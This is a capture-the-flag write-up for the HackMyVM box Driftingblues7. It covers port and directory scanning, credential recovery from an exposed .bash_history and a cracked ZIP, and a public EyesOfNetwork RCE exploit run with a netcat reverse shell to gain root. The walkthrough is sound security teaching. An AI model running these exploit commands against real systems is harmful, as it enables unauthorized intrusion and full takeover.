# Driftingblues7

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Driftingblues7 | tasiyanci | Beginner | HackMyVM |

**Summary:** This machine involved exploiting an EyesOfNetwork monitoring system running on port 443, but the attack path was simplified by exposed sensitive files through a Python SimpleHTTPServer on port 66. The exploit chain consisted of discovering credentials through exposed `.bash_history` file, breaking a password-protected ZIP file containing admin credentials, and leveraging a known RCE vulnerability in EyesOfNetwork to gain root access.

---

## Reconnaissance

### Network Discovery

Initial network scanning was performed to identify the target machine within the subnet:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] IP: 192.168.100.1 | Subnet: 192.168.100.0/24
[*] Scanning...

[+] Target Found:
------------------------------------------------------------
192.168.100.2   | 08-00-27-66-0c-60  | VirtualBox
192.168.100.24  | 08-00-27-54-f8-48  | VirtualBox
------------------------------------------------------------
```

The target machine was identified as `192.168.100.24`.

### Port Scanning

Comprehensive port scanning revealed multiple services running on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV 192.168.100.24 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-23 17:58 WIB
Nmap scan report for 192.168.100.24
Host is up (0.0041s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 c4:fa:e5:5f:88:c1:a1:f0:51:8b:ae:e3:fb:c1:27:72 (RSA)
|   256 01:97:8b:bf:ad:ba:5c:78:a7:45:90:a1:0a:63:fc:21 (ECDSA)
|_  256 45:28:39:e0:1b:a8:85:e0:c0:b0:fa:1f:00:8c:5e:d1 (ED25519)
66/tcp   open  http            SimpleHTTPServer 0.6 (Python 2.7.5)
|_http-title: Scalable Cost Effective Cloud Storage for Developers
80/tcp   open  http            Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
|_http-title: Did not follow redirect to https://192.168.100.24/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
111/tcp  open  rpcbind         2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
|_ssl-date: TLS randomness does not represent time
| http-title: EyesOfNetwork
|_Requested resource was /login.php##
| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-04-03T14:37:22
|_Not valid after:  2022-04-03T14:37:22
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
2403/tcp open  taskmaster2000?
3306/tcp open  mysql           MariaDB 10.3.23 or earlier (unauthorized)
8086/tcp open  http            InfluxDB http admin 1.7.9
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
```

Key services identified:
- **Port 22**: SSH (OpenSSH 7.4)
- **Port 66**: Python SimpleHTTPServer 0.6
- **Port 80**: Apache HTTP (redirects to HTTPS)
- **Port 443**: Apache HTTPS running EyesOfNetwork
- **Port 3306**: MySQL/MariaDB
- **Port 8086**: InfluxDB

### Web Application Enumeration

#### Port 80 Analysis

Initial directory brute-forcing on port 80 yielded minimal results:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://192.168.100.24/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,sql,bak,txt,pem,zip

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.24/
 🚩  In-Scope Url          │ 192.168.100.24
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, sql, bak, txt, pem, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        7l       18w        -c Auto-filtering found 404-like response
404      GET        7l       24w      211c http://192.168.100.24/server-status
[####################] - 53s    33257/33257   0s      found:1       errors:1
[####################] - 52s    33257/33257   641/s   http://192.168.100.24/
```

The port 80 service redirected to HTTPS, leading to the EyesOfNetwork login page.

![alt text](image-2.png)

#### Port 66 Analysis

Port 66 proved to be more fruitful, hosting a Python SimpleHTTPServer with exposed files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://192.168.100.24:66/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,sql,bak,txt,pem,zip

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.24:66/
 🚩  In-Scope Url          │ 192.168.100.24
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, sql, bak, txt, pem, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       25w      195c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      168l      495w     6203c http://192.168.100.24:66/index_files/css.css
200      GET       60l      116w      774c http://192.168.100.24:66/.bash_history
200      GET      182l      704w    23906c http://192.168.100.24:66/index_files/main.js
200      GET        1l      222w    13507c http://192.168.100.24:66/index_files/b2_nav.css
200      GET       12l       30w      176c http://192.168.100.24:66/.bashrc
200      GET        1l       34w     1435c http://192.168.100.24:66/index_files/counter.css
200      GET        6l       51w     4303c http://192.168.100.24:66/index_files/home-two-cloud-copy.webp
200      GET       78l      413w    37371c http://192.168.100.24:66/index_files/b2-customer-logos.jpg
200      GET        5l     1413w    95957c http://192.168.100.24:66/index_files/jquery-1.js
200      GET       12l       22w     1521c http://192.168.100.24:66/index_files/conversion.js
200      GET        5l     1446w   122540c http://192.168.100.24:66/index_files/bootstrap.css
200      GET      491l     2493w   197699c http://192.168.100.24:66/index_files/home-illustration-using-single-cloud.jpg
200      GET       11l       40w     2471c http://192.168.100.24:66/index_files/backblaze-logo.webp
200      GET      526l     1320w    17477c http://192.168.100.24:66/
200      GET      526l     1320w    17477c http://192.168.100.24:66/index.htm
301      GET        0l        0w        0c http://192.168.100.24:66/index_files => http://192.168.100.24:66/index_files/
200      GET        9l       28w     1545c http://192.168.100.24:66/index_files/plang_english_a.webp
200      GET        4l       10w      666c http://192.168.100.24:66/index_files/dynamic-variables.js
200      GET        1l      180w    15260c http://192.168.100.24:66/index_files/main.css
200      GET        3l       15w     1178c http://192.168.100.24:66/index_files/nav.js
200      GET        3l        8w      941c http://192.168.100.24:66/index_files/event-id.js
200      GET        5l       36w     3407c http://192.168.100.24:66/index_files/home-two-mobile.webp
200      GET        1l       58w     8573c http://192.168.100.24:66/index_files/home.css
200      GET        1l      129w     8735c http://192.168.100.24:66/index_files/best-online-backup-service2.css
```

Two critical files were discovered: `.bashrc` and `.bash_history`. These files suggested that the Python SimpleHTTPServer was running from the `/root` directory.

## Initial Access

### File Extraction and Analysis

#### Downloading Exposed Files

The exposed `.bash_history` file contained valuable information about the system configuration and user activities:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ wget http://192.168.100.24:66/.bash_history
--2026-01-23 18:04:40--  http://192.168.100.24:66/.bash_history
Connecting to 192.168.100.24:66... connected.
HTTP request sent, awaiting response... 200 OK
Length: 774 [application/octet-stream]
Saving to: '.bash_history'

.bash_history   100%[=======>]     774  --.-KB/s    in 0s

2026-01-23 18:04:40 (43.9 MB/s) - '.bash_history' saved [774/774]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ cat .bash_history
ls
cd /var/www
ls
cd html/
ls
ls -la
ip a
clear
cd /srv/eyesofnetwork
grep -lr 'admin'
cleear
clear
ls
nano
yum install nano
grep -lr 'admin' > list
nano list
rm list
clear
mysql
mysql -u root -p
cd /root
ls
wget 192.168.2.43:81/db8.zip
unzip db8.zip
ls
rm db8.zip
python -m SimpleHTTPServer 81
ls
wget 192.168.2.44/eon
ls
ls -la
chmod +x eon
nano upit.sh
chmod +x upit.sh
crontab -e
nano upit.sh
reboot
nano /etc/issue
nano /etc/hosts
nano /etc/hostname
ls
crontab -e
ls
rm index.htm
wget 192.168.2.43:81/db7i.htm
mv db7i.htm index.htm
ls
wget 192.168.2.43:81/hroot.txt
wget 192.168.2.43:81/huser.txt
mv hroot.txt root.txt
mv huser.txt user.txt
cat root.txt
cd /srv/eyesofnetwork
ls
cd eonapi/
ls
grep -lr createEonUser
nano include/ObjectManager.php
shutdown -h now
```

This revealed several key insights:
- The system is running EyesOfNetwork in `/srv/eyesofnetwork`
- Root has been downloading files including a file called `eon`
- There are `root.txt` and `user.txt` flag files
- A script `upit.sh` was created and scheduled via cron

#### Extracting Additional Files

Based on the bash history, several files were downloaded:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ wget http://192.168.100.24:66/eon
--2026-01-23 18:05:48--  http://192.168.100.24:66/eon
Connecting to 192.168.100.24:66... connected.
HTTP request sent, awaiting response... 200 OK
Length: 248 [application/octet-stream]
Saving to: 'eon'

eon             100%[=======>]     248  --.-KB/s    in 0.007s

2026-01-23 18:05:56 (35.1 KB/s) - 'eon' saved [248/248]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ cat eon
UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUU
Rw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAA
AABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEA
AQBbAAAARgAAAAAA
```

The `eon` file appeared to be Base64-encoded content. Decoding it revealed a ZIP archive:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ cat eon | base64 -d > eon.zip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ ls -la
total 56
drwxr-xr-x   2 ouba ouba  4096 Jan 23 18:06 .
drwxrwxrwt 106 root root 36864 Jan 23 17:39 ..
-rw-r--r--   1 ouba ouba   774 Apr  4  2021 .bash_history
-rw-r--r--   1 ouba ouba   176 Dec 29  2013 .bashrc
-rw-r--r--   1 ouba ouba   248 Apr  3  2021 eon
-rw-r--r--   1 ouba ouba   183 Jan 23 18:06 eon.zip
```

#### Flag Discovery

Interestingly, the flag files were directly accessible through the web server:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ wget http://192.168.100.24:66/user.txt
--2026-01-23 18:08:16--  http://192.168.100.24:66/user.txt
Connecting to 192.168.100.24:66... connected.
HTTP request sent, awaiting response... 200 OK
Length: 32 [text/plain]
Saving to: 'user.txt'

user.txt        100%[=======>]      32  --.-KB/s    in 0.004s

2026-01-23 18:08:20 (8.65 KB/s) - 'user.txt' saved [32/32]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ cat user.txt
[REDACTED]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ wget http://192.168.100.24:66/root.txt
--2026-01-23 18:08:39--  http://192.168.100.24:66/root.txt
Connecting to 192.168.100.24:66... connected.
HTTP request sent, awaiting response... 200 OK
Length: 32 [text/plain]
Saving to: 'root.txt'

root.txt        100%[=======>]      32  --.-KB/s    in 0.004s

2026-01-23 18:08:39 (7.35 KB/s) - 'root.txt' saved [32/32]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ cat root.txt
[REDACTED]
```

Note: The flags were prematurely exposed through the SimpleHTTPServer, which appears to be an unintended configuration issue by the box author.

### Credential Extraction

#### ZIP File Password Cracking

The `eon.zip` file was password-protected and contained credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ unzip eon.zip
Archive:  eon.zip
[eon.zip] creds.txt password:
   skipping: creds.txt               incorrect password

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ zip2john eon.zip > hash
ver 2.0 eon.zip/creds.txt PKZIP Encr: cmplen=31, decmplen=19, crc=D65B49F1 ts=9F03 cs=d65b type=0

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ john --show hash
eon.zip/creds.txt:killah:creds.txt:eon.zip::eon.zip

1 password hash cracked, 0 left
```

The ZIP file password was `killah`. Extracting the contents revealed admin credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ unzip eon.zip
Archive:  eon.zip
[eon.zip] creds.txt password:
 extracting: creds.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ cat creds.txt
admin
isitreal31__
```

**Discovered Credentials:**
- Username: `admin`
- Password: `isitreal31__`

#### Additional Script Analysis

The `upit.sh` script confirmed the SimpleHTTPServer configuration:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ wget http://192.168.100.24:66/upit.sh
--2026-01-23 18:06:38--  http://192.168.100.24:66/upit.sh
Connecting to 192.168.100.24:66... connected.
HTTP request sent, awaiting response... 200 OK
Length: 52 [application/x-sh]
Saving to: 'upit.sh'

upit.sh         100%[=======>]      52  --.-KB/s    in 0.002s

2026-01-23 18:06:39 (27.3 KB/s) - 'upit.sh' saved [52/52]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ cat upit.sh
#!/bin/bash

cd /root
python -m SimpleHTTPServer 66
```

This script explains why the `/root` directory was exposed through the web server on port 66.

## Privilege Escalation

### EyesOfNetwork Exploitation

With the admin credentials obtained, 

![alt text](image-3.png)

the next step was to exploit the EyesOfNetwork application. Research revealed known RCE vulnerabilities in EyesOfNetwork versions 5.1-5.3.

#### Exploit Tool Acquisition

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/mnt/d/hackmyvm-writeups/machines/Driftingblues7]
└─$ git clone https://github.com/h4knet/eonrce.git
Cloning into 'eonrce'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 20 (delta 7), reused 12 (delta 4), pack-reused 0 (from 0)
Receiving objects: 100% (20/20), 270.60 KiB | 345.00 KiB/s, done.
Resolving deltas: 100% (7/7), done.

┌──(ouba㉿CLIENT-DESKTOP)-[/mnt/d/hackmyvm-writeups/machines/Driftingblues7]
└─$ cd eonrce

┌──(ouba㉿CLIENT-DESKTOP)-[/mnt/…/hackmyvm-writeups/machines/Driftingblues7/eonrce]
└─$ ls
eonrce2.py  eonrce51.gif  eonrce53.gif  eonrce.py  LICENSE  README.md
```

#### Initial Exploit Attempts

Several attempts were made with the exploit tools. The first script (`eonrce.py`) failed due to API response issues:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/mnt/…/hackmyvm-writeups/machines/Driftingblues7/eonrce]
└─$ python3 eonrce.py https://192.168.100.24/ -user admin -password 'isitreal31__' -ip 192.168.100.1 -port 4444
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.3 RCE                                                       |
| 03/2020 - v1.1 - Clément Billac - Twitter: @h4knet                          |
+-----------------------------------------------------------------------------+

[*] Reverse shell: 192.168.100.1:4444
[*] User to create: admin:isitreal31__
[*] EyesOfNetwork login page found
[*] EyesOfNetwork API page found. API version: 2.4.2
[+] Admin user key obtained: a3605c07186ff36c091a700f96e7968b24e2c256609b43f082548ccace3f2c37
[x] An error occured while querying the API. Missing result value in JSON response or unexpected HTTP status response
```

#### Successful Exploitation

The second exploit script (`eonrce2.py`) was more successful. After establishing an active admin session through the web interface, the exploit was able to obtain the session ID and create a reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/mnt/…/hackmyvm-writeups/machines/Driftingblues7/eonrce]
└─$ sudo python3 eonrce2.py https://192.168.100.24/ -ip 192.168.100.1 -port 4444
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.1 to 5.3 RCE exploit                                        |
| 03/2020 - v1.0 - Clément Billac - Twitter: @h4knet                        |
+-----------------------------------------------------------------------------+

[*] EyesOfNetwork login page found
[+] Application seems vulnerable. Time: 1.007901
[*] The admin user has at least one session opened
[*] Found the admin session_id size: 29
[+] Obtained admin session ID: 524161603
[+] Discovery job successfully created with ID: 2
[*]  Spawning netcat listener:
Can't grab 192.168.100.1:4444 with bind : Cannot assign requested address

[*] Job 2 removed
```

#### Establishing Reverse Shell

A netcat listener was set up to catch the reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues7]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 57424
sh: no job control in this shell
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Access Achieved

The reverse shell provided immediate root access to the target system:

```bash
sh-4.2# cd
sh-4.2# ls -la
total 80
dr-xr-x---.  4 root root  4096 Apr  3  2021 .
dr-xr-xr-x. 19 root root  4096 Apr  3  2021 ..
-rw-------.  1 root root   774 Apr  3  2021 .bash_history
-rw-r--r--.  1 root root    18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root   176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root   176 Dec 28  2013 .bashrc
-rw-r--r--.  1 root root   100 Dec 28  2013 .cshrc
drwxr-----.  3 root root  4096 Apr  3  2021 .pki
-rw-r--r--.  1 root root   129 Dec 28  2013 .tcshrc
-rw-------.  1 root root  1401 Apr  3  2021 anaconda-ks.cfg
-rwxr-xr-x.  1 root root   248 Apr  3  2021 eon
-rw-r--r--   1 root root 17477 Apr  7  2021 index.htm
drwxr-xr-x.  2 root root  4096 Apr  3  2021 index_files
-rw-r--r--   1 root root    32 Apr  7  2021 root.txt
-rwxr-xr-x.  1 root root    52 Apr  3  2021 upit.sh
-rw-r--r--   1 root root    32 Apr  7  2021 user.txt
```

### Flag Verification

The flags were verified from the compromised system:

```bash
sh-4.2# cat user.txt ; echo ; cat root.txt ; echo
[REDACTED]
[REDACTED]
sh-4.2#
```

The machine was successfully rooted, with both user and root flags obtained. The presence of flags directly accessible via the web server suggests an unintended configuration by the author, making this machine easier than potentially intended.